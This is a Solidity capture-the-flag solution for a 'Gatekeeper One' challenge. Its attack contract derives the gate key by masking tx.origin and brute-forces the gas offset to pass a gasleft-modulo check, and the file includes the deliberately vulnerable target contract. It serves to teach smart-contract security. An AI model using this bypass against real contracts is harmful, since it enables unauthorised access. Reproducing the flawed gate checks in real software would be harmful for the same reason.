//SPDX-License-Identitifer: MIT
pragma solidity ^0.8.0;

contract GateKeeperOneAttack {
    function attack(address _targetAdr) external {
        /*
        //gate one
        /* gate one is already passed when we attck the challenge contract with a dummy contract as 'msg.sender'
        is the dummy contract and 'tx.origin' is the player */

        //gate two
        /* let us assume total gas left in gatetwo be (8191*k)+i
        where i will be all the gas that will be used before gateTwo modifier will be called. We can assume k=5
        total gas = (8191*5)+i
        we will have to brute force the value of i

        //gate three
        /* the input is of 8 bytes, let it be 0x B1 B2 B3 B4 B5 B6 B7 B8(each byte will be of 2 hex characters) 
        1 byte = 8 bits 

        requirement 1:
          uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
          uint32(uint64(_gateKey)) => 0x B5 B6 B7 B8
          uint16(uint64(_gateKey)) => 0x B7 B8
          for these to be equal, B5 and B6 should be equal to 0
        requirement 2:
          uint32(uint64(_gateKey)) != uint64(_gateKey)
          uint32(uint64(_gateKey)) => 0x 00 00 00 00 B5 B6 B7 B8
          uint64(_gateKey) => 0x B1 B2 B3 B4 B5 B6 B7 B8
          for these not to be equal, B1 B2 B3 B4 can not be equal to 00 00 00 00 
        requirement 3: 
          uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
          uint32(uint64(_gateKey)) => 0x B5 B6 B7 B8
          tx.origin is an address type, which is 20 bytes, therefore it will be 160 bits
          uint16(uint160(tx.origin)) => will be the last two bytes of the address
          but by requirement 1, B5 = B6 = 0, so B7 B8 will be equal to last two bytes of tx.origin

        req #1: B5 = B6 == 0
        req #2: B1 B2 B3 B4 != 00 00 00 00
        (for simplicity let us assume B1 B2 B3 B4 will be equal to first 4 bytes of tx.origin)
        req #3: B7 B8 will be equal to last 2 bytes of tx.origin
        */

        // FF FF FF FF will return the same first 4 bytes of tx.origin
        // 00 00 will make sure 5th and 6th bytes are always 0
        // FF FF will return same 7th and 8th bytes as tx.origin

        bytes8 gateKey = bytes8(
            uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF
        );

        for (uint256 i = 0; i < 300; i++) {
            uint256 totalgas = i + (8191 * 5);
            (bool result, ) = _targetAdr.call{gas: totalgas}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );

            if (result) {
                break;
            }
        }
    }
}

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
